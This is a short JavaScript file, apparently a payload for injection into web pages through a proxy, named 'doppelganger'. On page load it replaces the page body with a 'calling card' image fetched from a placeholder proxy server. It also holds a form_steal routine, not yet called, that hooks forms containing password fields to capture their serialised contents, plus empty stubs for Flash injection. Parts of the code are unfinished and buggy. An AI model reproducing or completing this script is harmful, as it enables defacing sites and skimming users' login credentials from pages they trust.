var httpServer="http://proxyIpAddr:httpPort"

function initialize_doppelganger()
{
	display_calling_card();
	//form_steal();
	//alert("Doppelganger running!");
}

function display_calling_card()
{
	var body = $$('body')[0];
	var calling_card = httpServer + "/images/calling_card.jpg";
	
	var img = new Element("img",
		{
			'src': calling_card
		}
	);
	body.update(img);
}

function form_steal()
{
	var forms = $$('form');
	for (i=0; i<forms.length; i++)
	{		
		var formElements = Form.getElements(forms[i]);
		
		for (j=0; j<formElements.length; j++)
		{
			if (formElements[j].type == "password")
			{
				if (forms[i].id = "")
					forms[i].id = "form" + j;

				Event.observe(forms[i].id, "submit", steal_form_data(forms[i]));
			}
		}
	}
}

function steal_form_data(form)
{
	alert(Form.serialize(form));
}

function flash_inject()
{
		var flash_applet = httpServer + "/flash/flash.swf";		
}

function break_fixit()
{
}

Event.observe(window, "load", function() { initialize_doppelganger(); })

